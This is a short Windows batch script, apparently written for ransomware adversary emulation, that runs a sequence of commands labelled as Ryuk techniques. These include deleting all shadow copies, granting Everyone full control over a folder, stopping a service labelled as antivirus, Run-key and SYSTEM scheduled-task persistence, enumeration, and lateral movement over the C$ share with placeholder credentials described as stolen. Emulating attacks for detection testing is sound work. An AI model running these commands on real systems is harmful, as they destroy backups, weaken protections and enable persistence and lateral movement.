@echo off
REM --- Ryuk Enterprise Layer Techniques in CMD ---

REM Adjust token privileges
whoami /priv

REM Registry Run key persistence
title Registry Persistence Example
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Example /t REG_SZ /d "calc.exe"

REM Command execution with cmd.exe
cmd.exe /c echo Persistence established.

REM File & Directory Enumeration
dir C:\ /s /b

REM Modify file permissions
icacls "C:\TestFolder" /grant Everyone:F /T /C /Q

REM Stop AV services
net stop "wuauserv"

REM Delete shadow copies
vssadmin delete shadows /all /quiet

REM Masquerade technique not directly applicable in .bat

REM Execute binaries
start notepad.exe

REM List running processes
tasklist

REM Lateral movement via C$ share
net use \\TARGET-PC\C$ /user:DOMAIN\Administrator password123

REM Create scheduled task
schtasks /create /tn "ExampleTask" /tr "calc.exe" /sc onstart /ru SYSTEM

REM Stop processes
taskkill /F /IM notepad.exe

REM Enumerate drives
wmic logicaldisk get name

REM Check system locale
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Nls\Language" /v InstallLanguage

REM Get ARP table
arp -a

REM Wake-on-LAN requires external tool (e.g., wol.exe)
REM Example: wol.exe 00:11:22:33:44:55

REM Use stolen credentials for network share
net use \\TARGET-PC\C$ /user:DOMAIN\Admin P@ssw0rd
